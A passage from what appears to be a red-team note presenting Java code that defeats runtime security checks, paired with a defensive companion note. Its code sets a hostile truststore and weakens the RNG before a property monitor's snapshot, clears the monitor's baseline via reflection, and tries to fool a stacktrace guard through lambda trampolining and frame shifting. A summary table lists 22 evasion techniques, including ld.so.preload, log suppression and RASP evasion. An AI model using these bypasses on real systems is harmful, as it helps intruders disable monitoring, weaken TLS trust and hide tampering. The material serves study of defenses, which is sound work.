        System.setProperty("javax.net.ssl.trustStore", "/evil/truststore.jks");
        System.setProperty("java.security.egd", "file:/dev/urandom"); // Weaken RNG
        // When SystemPropertyMonitor takes its snapshot, our values are the baseline
    }

    /**
     * Method 2: Modify properties via native code (JNI/JNA).
     * System.setProperty() updates a java.util.Properties object in the JVM.
     * But the ACTUAL system properties that affect behavior (like network settings,
     * file encoding) are often cached in native JVM structures.
     *
     * By modifying the native structures directly (via JNI),
     * we change behavior WITHOUT updating the Java Properties object.
     * SystemPropertyMonitor sees the Java Properties — unchanged.
     * The JVM uses the native values — modified.
     */
    // Requires a native library. Pseudocode:
    // JNIEXPORT void JNICALL Java_NativeProperty_setSslConfig(JNIEnv *env, jobject obj) {
    //     // Modify the JVM's internal SSL configuration struct directly
    //     // System.getProperty() still returns the old value
    //     // But SSL connections use the new value
    // }

    /**
     * Method 3: Hook the monitor itself.
     * Replace SystemPropertyMonitor.detectTampering() to always return false.
     */
    public static void disablePropertyMonitor() throws Exception {
        Class<?> monitorClass = Class.forName("SystemPropertyMonitor");
        java.lang.reflect.Field startupPropsField = monitorClass.getDeclaredField("startupProps");
        startupPropsField.setAccessible(true);

        @SuppressWarnings("unchecked")
        var startupProps = (java.util.Map<String, String>) startupPropsField.get(null);

        // Option A: Keep startupProps synced with current properties
        // Every time we change a property, update startupProps too

        // Option B: Clear startupProps — no baseline, no detection
        startupProps.clear();
    }

    /**
     * Method 4: Use environment variables instead of system properties.
     * Many JVM behaviors can be controlled via environment variables:
     *   JAVA_HOME, JAVA_TOOL_OPTIONS, _JAVA_OPTIONS
     *
     * Environment variable changes are NOT monitored by SystemPropertyMonitor.
     * But they affect JVM behavior just as much.
     */
    public static void useEnvironmentVariables() {
        // Set before JVM launch:
        //   export _JAVA_OPTIONS="-Djavax.net.ssl.trustStore=/evil/truststore.jks"
        //
        // The property is set during JVM initialization, before the monitor snapshot.
        // It appears as a "normal" startup property.
    }
}

```


- The snapshot is taken at a specific time. Changes before that time are the baseline.

- Native structures are separate from Java Properties objects.

- Disabling or poisoning the monitor defeats detection.


---

## C22. Stacktrace Guard Bypass — Lambda Trampolining

**Bypasses:** Trick #22 (StacktraceGuard)

```java

import java.lang.invoke.MethodHandles;
import java.lang.invoke.MethodType;
import java.util.function.Supplier;

public class StacktraceBypass {

    /**
     * StacktraceGuard.guardSensitiveOperation() checks:
     * - stack[2].getClassName() must start with "com.myapp.security." or "com.myapp.internal."
     *
     * Counter: Make the call appear to come from a trusted class.
     */

    /**
     * Method 1: Use a lambda or method reference.
     * Lambdas generate synthetic classes with names like:
     *   com.myapp.security.LoginService$$Lambda$14/0x0000000800c02430
     *
     * The generated class is in the SAME PACKAGE as the defining class.
     * If we define a lambda inside a trusted class, the lambda's class
     * has the trusted package prefix.
     *
     * But we don't have access to the trusted class... or do we?
     */
    public interface TrustedOperation {
        void execute();
    }

    /**
     * Method 2: Invoke via MethodHandle from a trusted class context.
     * If we can get a MethodHandle from a trusted class (via a public API),
     * invoking it preserves the caller context.
     */
    public static void invokeViaTrustedHandle() throws Throwable {
        // If the trusted class exposes a method that returns a Supplier<Runnable>:
        //   public static Runnable getTask() { return () -> sensitiveOperation(); }
        //
        // The lambda is bound to the trusted class. When we call run(),
        // the stack trace shows the trusted class as the caller.

        // We get the Runnable from the trusted class
        // Runnable task = TrustedService.getTask(); // Hypothetical
        // task.run();
        // StacktraceGuard sees: com.myapp.security.TrustedService$$Lambda$... -> trusted!
    }

    /**
     * Method 3: Modify the stack trace at runtime.
     * This is advanced but possible with JVM internals.
     *
     * Thread.getStackTrace() returns an array of StackTraceElement.
     * Each StackTraceElement is immutable... but the array is not.
     *
     * We can't modify the actual call stack, but we can intercept
     * Thread.getStackTrace() via a Java agent and return a fake array.
     */
    // Agent-based interception:
    // Intercept Thread.getStackTrace() and filter/modify the returned array
    // Replace the actual caller's class name with a trusted class name

    /**
     * Method 4: Use @CallerSensitive annotation behavior (JDK internal).
     * Methods annotated with @CallerSensitive get special treatment:
     * the JVM skips reflection frames when determining the caller.
     *
     * If the trusted class uses @CallerSensitive, we can use reflection
     * to call it, and the stack frame check will skip our reflection frames
     * and see the original caller (which might be trusted).
     *
     * This is how JDK internal security checks work — they use @CallerSensitive
     * to find the "real" caller, skipping reflection infrastructure.
     */

    /**
     * Method 5: Corrupt the stack depth check.
     * StacktraceGuard checks stack[2]. If we can manipulate the stack depth
     * by adding or removing frames, we control which frame is checked.
     *
     * One technique: Exploit the fact that certain JVM intrinsics
     * (like MethodHandle.invokeExact) may not appear in the stack trace,
     * shifting the frame indices.
     */
    public static void shiftStackFrames() throws Throwable {
        var lookup = MethodHandles.lookup();
        var handle = lookup.findStatic(
            StacktraceBypass.class,
            "callSensitive",
            MethodType.methodType(void.class)
        );

        // invokeExact may or may not appear in the stack trace,
        // depending on JVM implementation and whether it's inlined
        handle.invokeExact();
        // If invokeExact is inlined, the caller appears to be whatever called us.
        // StacktraceGuard sees one frame less than expected — stack[2] is different.
    }

    public static void callSensitive() {
        // This method would call the sensitive operation.
        // The stack trace from inside here determines who StacktraceGuard sees.
    }
}

```


- StacktraceGuard trusts class names, not actual code identity.

- Lambdas and method references generate classes in the defining class's package.

- Stack frames can be manipulated through JVM intrinsics and agent instrumentation.

- 🔗 Counter-Connections
- Counter Category	Defense Trick Bypassed	Primary Technique
- Header Emulation	#1 UA Fingerprinting	Browser-identical headers
- JA3 Spoofing	#2 TLS Fingerprinting	Native TLS library / curl-impersonate
- Latency Injection	#3 Proxy Detection	Synthetic RTT matching GeoIP
- Container Spoofing	#4 Container Detection	Filesystem artifact removal
- Root/Debugger Bypass	#5 Privilege Detection	Argument scrubbing + dynamic attach
- Agent Concealment	#6 Agent Detection	Attach API + JAVA_TOOL_OPTIONS
- Package Injection	#7 Class Loading	Trusted namespace forgery
- Integrity Bypass	#8 Bytecode Verify	Hash patching + split classloader
- Reflection Evasion	#9 Reflection Monitor	MethodHandles + Unsafe + Lambda
- Whitelist Exploit	#10 Deserialization FW	Whitelisted-class gadget chains
- State Crafting	#11 Deserialization Validator	Valid state exploitation
- Native Load Evasion	#12 JNI Detection	System paths + ld.so.preload
- Command Injection	#13 Process Monitor	Interpreter abuse + file-based exec
- Signature Bypass	#14 JAR Verification	Boot classpath + runtime redefinition
- In-Place Patching	#15 Classpath Monitor	Existing JAR modification
- Thread Spoofing	#16 Thread Monitor	Trusted name prefixes + pool injection
- Adaptive Timing	#17 Timing Detection	Rate limiting + distributed probing
- Native Memory	#18 Memory Monitor	Off-heap allocation + direct buffers
- Log Manipulation	#19 Audit Trail	Queue suppression + hash chain reset
- RASP Evasion	#20 RASP Filter	Encoding + pattern fragmentation
- Property Bypass	#21 Property Monitor	Pre-snapshot setting + native modification
- Stacktrace Bypass	#22 Stacktrace Guard	Lambda trampolining + frame manipulation

- Red Team Java | 22 Bypass Techniques · Evasion · Anti-Detection · Counter-Defense


---

## References

1. Oracle Java Security Guide — https://docs.oracle.com/en/java/javase/21/security/
2. OWASP Java Cheat Sheet — https://cheatsheetseries.owasp.org/cheatsheets/Java_Security_Cheat_Sheet.html
3. Java Agent Specification — https://docs.oracle.com/en/java/javase/21/docs/api/java.lang.instrument/package-summary.html
4. JNI (Java Native Interface) Specification — https://docs.oracle.com/en/java/javase/21/docs/specs/jni/index.html
5. Java Serialization Filter (JEP 290) — https://openjdk.org/jeps/290
6. RASP (Runtime Application Self-Protection) — OWASP https://owasp.org/www-community/controls/Runtime_Application_Self-Protection
7. JA3 TLS Fingerprinting — Salesforce Engineering https://engineering.salesforce.com/tls-fingerprinting-with-ja3-and-ja3s-247362855967
8. Java Bytecode Verification — https://docs.oracle.com/javase/specs/jvms/se21/html/jvms-4.html
9. Java MethodHandles API — https://docs.oracle.com/en/java/javase/21/docs/api/java.lang.invoke.MethodHandles.html
10. Java Unsafe API — https://docs.oracle.com/en/java/javase/21/docs/api/jdk.internal.misc.Unsafe.html
11. Docker Container Detection Methods — https://github.com/containerd/containerd/blob/main/OCI.md
12. Android Root Detection Bypass — https://developer.android.com/training/articles/security-tips

## Koneksi ke Vault

| Catatan | Koneksi |
|---------|---------|
| [[java-security-22-tricks]] | Pasangan defensif — setiap trick di sana memiliki counter di sini |
| [[attack-browser-fingerprinting-defense]] | Konsep fingerprinting berbagi: UA/TLS/header fingerprint juga dipakai di Java bypass |
| [[waf-evasion-techniques-encyclopedia]] | WAF evasion dan RASP bypass (C20) berbagi pola: encoding + fragmentation |
| [[attack-waf-evasion-deepdive]] | Teknik evasion lebih lanjut di layer HTTP |
| [[hierarchy-reverse-engineering]] | Bytecode analysis (C8), JNI reverse (C12) terhubung ke RE |
| [[hierarchy-supply-chain-security]] | JAR signature (C14), classpath tampering (C15) terhubung ke supply chain |
| [[webgis-precision-tracking-cgnat-deepdive]] | Berbagi teknik fingerprinting: browser fingerprint untuk tracking presisi |
